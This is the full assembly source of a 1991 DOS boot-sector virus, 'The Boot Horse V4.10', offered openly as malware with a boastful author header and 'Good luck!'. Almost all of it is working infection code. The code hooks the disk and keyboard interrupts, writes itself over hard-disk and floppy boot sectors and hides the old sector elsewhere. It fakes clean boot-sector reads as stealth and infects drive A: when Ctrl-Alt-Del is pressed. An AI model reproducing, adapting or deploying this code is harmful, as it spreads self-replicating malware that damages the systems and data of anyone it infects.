	.radix 16
	;******************************************
	;                                         *
	;       Code masters LTD. presents:       *
	;         THE BOOT HORSE V4.10            *
	;     Finished on the 25.04.1991.         *
	; This is a boot virus,which does not     *
	; "cuts" memory.It places itself into the *
	; second part of the interrupt table.If   *
	; it is resident you will not be able to  *
	; see the infected boot sector.If you     *
	; press CTRL-ALT-DEL & INT 13h had not    *
	; been changed,drive A: will be infected. *
	; It shows you the message 'Brr...!' with *
	; possibility 1/16.                       *
	;                        Good luck!       *
	;******************************************
Start:
	cld		;clear direction
	xor	ax,ax	;clear ax
	mov	bp,7c00 ;bp=7c00
	mov	ds,ax	;ds=ax=0
	mov	ss,ax	;ss=ax=0
	mov	sp,bp	;sp=bp=7c00
	push	ax	;save abs. addr. 0000:7c00 in stack for retf
	push	bp	;
	xor	di,di	;clear di
	les	bx,[di+9*4]	;load es:bx with current int 09h
	mov	word ptr [bp+old9h-Start],bx	;save it in a variable
	mov	word ptr [bp+old9h-Start+2],es
	les	bx,[di+13*4]	;load es:bx with current int 13h
	mov	word ptr [bp+old13h-Start],bx	;save it in a variable
	mov	word ptr [bp+old13h-Start+2],es
	mov	ax,0020 ;ax=20
	mov	[di+9*4],offset int9h-Start	;set int 09h
	mov	[di+9*4+2],ax
	mov	[di+13*4],offset int13h-Start ;set int 13h
	mov	[di+13*4+2],ax
	mov	es,ax		;es=ax=20
	mov	cx,0200 ;will move 512 bytes
	mov	si,bp		;si=bp=7c00
	rep	movsb		;move to 0020:0000 (vectors)
	push	es		;save es&ax for retf
	mov	ax,offset here-Start
	push	ax
	retf			;go to 0020:here-Start
here:
	test	byte ptr [046C],0F	;show a message with possibility 1/16
	jnz	dont
	mov	si,offset msg-Start	;si point the message
	mov	cx,endmsg-msg	;strings to show
show_it:
	db	26		;ES:lodsb
	lodsb			;load next char
	mov	ah,0e		;show char
	xor	bh,bh
	int	10		;do it
	loop	show_it ;show next
dont:
	xor	ah,ah		;initialize
	int	13
	mov	es,cx		;es=cx=0
	xchg	ax,di
	inc	ax		;ax=201 =>read one sector.
	mov	bx,bp		;bx=bp=7c00
	inc	cx		;sector 1,cylinder 0.boot sector
	mov	dx,0080 ;dx=0080
	cmp	byte ptr cs:[ident-Start],dl	;if equal=>loading from hdd
	je	hard
	push	dx		;save dx
	xor	dl,dl		;drive A:
	push	ax		;save ax
	int	13		;read old bootsector from diskette
	pop	ax		;restore ax=201,read one sector
	pop	dx		;drive C:
	mov	bx,0600 ;bx=600
	call	ojoj		;read hdd's boot sector
	jc	goout		;no hdd installed
	call	check		;infected?
	je	goout		;yes ->out!
	mov	ax,0301 ;write one sector (save old)
	push	ax	;save ax
	mov	cx,0004 ;sector 4,cylinder 0
	int	13		;do it
	mov	byte ptr cs:[ident-Start],dl ;set identificator
	push	cs		;es=cs
	pop	es
	mov	si,07BE ;
	mov	di,01BE ;        copy old partition
	mov	cx,64d		;
	rep	movsb		;
	pop	ax		;Write one sector,ax=301
	xor	bx,bx		;from addr ES:BX,bx=0 =>write virus
	inc	cx		;sector 1,cylinder 0.Boot sector.
hard:
	int	13		;do it
goout:
	mov	byte ptr cs:[ident-Start],0	;set ident
	retf					;go to 0000:7c00
int13h:
			;save ax,ds
	push	ax
	push	ds
	cmp	ah,02	;function read?
	jne	skip
	cmp	dl,80	;drive A,B or C?
	ja	skip
	cmp	cx,0001 ;
	jne	notboot ;gonna read bootsector?
	or	dh,dh	;
	jnz	notboot ;
	pop	ds	;restore ax,ds
	pop	ax
	call	ojoj	;execute the task
	jc	all	;if error then no sence
	pushf		;save some registers
	push	ax
	push	cx
	push	dx
	call	check	;infected?
	jne	notnow
	mov	ax,0201
	inc	cx	;if so then make some tricks
	inc	cx	;sector 3,cylinder 0
	inc	dh	;side 1
	test	dl,80	;hdd?
	je	dolie	;if not then
	inc	cx	;sector 4,cylinder 0
	dec	dh	;side 0
dolie:
	call	ojoj	;read boot
notnow:
	pop	dx	;restore registers
	pop	cx
	pop	ax
	popf
all:
;       retf    0002    ;return to caller
db	0ca,2,0
notboot:
	test	dl,80	;drive=C?
	jne	skip	;if so =>out!
	xor	ax,ax	;clear ax
	mov	ds,ax	;ds=ax=0
	mov	al,byte ptr [043F] ;this byte shows whether the motor is active
	push	dx	;save dx
	inc	dl	;adjust dl
	test	al,dl	;check if the motor is active.
	pop	dx	;restore dx
	jnz	skip	;if so =>leave
	call	infect	;infect it
skip:
	pop	ds	;restore flags,ax,ds
	pop	ax
do:
		db	0EAh	;go to the original int 13h
	old13h	dd	000h	;JMP XXXX:XXXX
infect:
	push	bx	;save some registers
	push	cx
	push	dx
	push	es
	mov	ax,0201 ;will read 1 sector
	mov	cx,0001 ;sector 1,cylinder 0
	xor	dh,dh	;side 0
	call	ojoj	;do it
	jc	leave	;on error...
	mov	byte ptr cs:[count-Start],36d	;load counter
	call	check	;infected?
	je	leave	;leave if so.
	mov	ax,0301 ;write one sector
	inc	cx	;sector 3,cylinder 0
	inc	cx
	inc	dh	;side   1
	push	ax	;save   ax
	call	ojoj	;do write (save old bootsector)
	pop	ax	;restore ax
	jc	leave	;write protected
	push	cs	;es=cs
	pop	es
	xor	bx,bx	;write virus
	dec	cx	;make cx=1
	dec	cx	;sector 1,cylinder 0
	dec	dh	;side 0
	call	ojoj	;that's it!
leave:
	pop	es	;restore registers
	pop	dx
	pop	cx
	pop	bx
	ret		;return
ojoj:
	pushf		;this   calles the original int 13h
	push	cs
	call	do
	ret
check:
	cmp	es:[bx],31FCh	;this checks the first 2 bytes
	ret			;to understand if the disk is infected
int9h:
	push	ax		;the keybord interrupt.save AX
	mov	ah,02		;check  if ctrl-alt is pressed
	int	16		;
	test	al,00001100b	;if not =>exit
	jz	exit
	in	al,60		;is del pressed?
	cmp	al,53
	je	cont		;if so...
exit:
	pop	ax		;restore ax
		db	0EAh	;go to the old int 09h
	old9h	dd	000h	;JMP XXXX:XXXX
cont:
	mov	al,20		;free interrupts
	out	20,al		;do it
	mov	ax,0003 ;clear screen
	int	10		;do it
	mov	dx,03D8 ;chose video port
	mov	al,04		;video flag
	out	dx,al		;no video
	mov	ax,0060 ;es=60
	mov	es,ax		;
	xor	bx,bx		;drive A
	xor	dl,dl		;bx=0
	mov	ds,bx		;dx=bx=0
	mov	byte ptr cs:[count-Start],18d ;load counter to 1 sec.
	cli				;set int 1ch
	mov	[bx+1c*4],offset int1ch-Start
	mov	[bx+1c*4+2],cs
	sti
	cmp	[bx+13*4],offset int13h-Start ;is int 13h changed?
	jne	reset			;if so reset computer
	call	infect			;infect disk in drive A
reset:
	xor	bx,bx
	mov	ds,bx			;don't count memory !
	mov	[bx+0472],1234
;       JMP     FFFF:0000               ;Reset
db	0ea,00,00,0ff,0ff
int1ch:
	dec	byte ptr cs:[count-Start]	;decrease counter
	jz	reset			;if zero then reset
	iret				;otherwise continue
msg		db	'Brr...!',7,0a,0dh, ;message
endmsg		label	word
ident		db	0		;0 for fdd,80 for hdd
count		label	byte
partition	db	64d	dup (?)
bootident	dw	0AA55
endcode label word

